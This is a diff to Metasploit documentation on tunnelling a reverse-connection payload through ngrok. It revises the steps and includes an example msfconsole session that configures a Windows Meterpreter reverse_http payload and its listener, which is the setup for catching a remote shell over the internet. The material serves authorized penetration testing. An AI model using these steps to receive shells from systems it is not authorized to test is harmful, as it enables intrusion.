@@ -22,17 +22,22 @@ e.g. reverse_tcp, reverse_http, reverse_https, etc. but not reverse_named_pipe. 
 used to forward a random public port to the Metasploit listener on port 4444. This scenario assumes that Metasploit and
 ngrok are running on the same host.
 
+**NOTE:** At this time, payloads handle DNS hostnames inconsistently. Some are compatible with hostnames while others
+require IP addresses to be specified as the target to connect to (the `LHOST` option). To ensure the specified payload
+will work, the hostname provided by ngrok should be resolved to an IP address and the IP address should be used as the
+value for `LHOST`.
+
 1. Start a TCP tunnel using ngrok: `ngrok tcp localhost:4444`.
-1. ngrok should start running and display a few settings, including a line that says "Forwarding". Note the host and IP
-   address from this line, e.g. `4.tcp.ngrok.io:13779`
+1. ngrok should start running and display a few settings, including a line that says "Forwarding". Note the host and
+   port number from this line, e.g. `4.tcp.ngrok.io:13779`
+1. Resolve the hostname from the previous step to an IP address.
 1. Start msfconsole and use the desired payload or exploit module.
   * Using `msfconsole` for both generating the payload and handling the connection is recommended over using `msfvenom`
     for two reasons.
     1. Using `msfvenom` starts up an instance of the framework to generate the payload, making it a slower process.
     2. Using `msfconsole` to configure both the payload and handler simultaneously ensures that the options are set for
        both, eliminating the possibility that they are out of sync.
-1. Set the `LHOST` option to the address noted in step 2, `4.tcp.ngrok.io` in the example. This is where the payload is
-   expecting to connect to.
+1. Set the `LHOST` option to the IP address noted in step 3. This is where the payload is expecting to connect to.
 1. Set the `LPORT` option to the port noted in step 2, `13779` in the example.
 1. Set the `ReverseListenerBindAddress` option to `127.0.0.1`. This is where the connection will actually be accepted
    from ngrok.
@@ -57,17 +62,23 @@ Version                       3.16.0
 Region                        United States (us)
 Latency                       33ms
 Web Interface                 http://127.0.0.1:4040
-Forwarding                    tcp://0.tcp.ngrok.io:17511 -> localhost:4444
+Forwarding                    tcp://4.tcp.ngrok.io:17511 -> localhost:4444
 
 Connections                   ttl     opn     rt1     rt5     p50     p90
                               0       0       0.00    0.00    0.00    0.00
 ```
 
-metasploit side:
+resolve the hostname `4.tcp.ngrok.io` to an IP address
 ```
+$ dig +short 4.tcp.ngrok.io
+192.0.2.1
+```
+
+metasploit side:
+```msf
 msf6 > use payload/windows/x64/meterpreter/reverse_http
-msf6 payload(windows/x64/meterpreter/reverse_http) > set LHOST 0.tcp.ngrok.io
-LHOST => 0.tcp.ngrok.io
+msf6 payload(windows/x64/meterpreter/reverse_http) > set LHOST 192.0.2.1
+LHOST => 192.0.2.1
 msf6 payload(windows/x64/meterpreter/reverse_http) > set LPORT 17511
 LPORT => 17511
 msf6 payload(windows/x64/meterpreter/reverse_http) > set ReverseListenerBindAddress 127.0.0.1
@@ -103,11 +114,11 @@ tcp tunnel for a reverse-connection payload will not be able to be opened at the
 to open a second tcp tunnel and follow the steps above for the payload configuration.
 
 1. Start a TCP tunnel using ngrok: `ngrok tcp localhost:4444`.
-1. ngrok should start running and display a few settings, including a line that says "Forwarding". Note the host and IP
-   address from this line, e.g. `4.tcp.ngrok.io:13779`
+1. ngrok should start running and display a few settings, including a line that says "Forwarding". Note the host and
+   port number from this line, e.g. `4.tcp.ngrok.io:13779`
+1. Resolve the hostname from the previous step to an IP address.
 1. Start msfconsole and use the desired module.
-1. Set the `SRVHOST` option to the address noted in step 2, `4.tcp.ngrok.io` in the example. This is where the payload is
-   expecting to connect to.
+1. Set the `LHOST` option to the IP address noted in step 3. This is where the payload is expecting to connect to.
 1. Set the `SRVPORT` option to the port noted in step 2, `13779` in the example.
 1. Set the `ListenerBindAddress` option to `127.0.0.1`. This is where the connection will actually be accepted
    from ngrok.
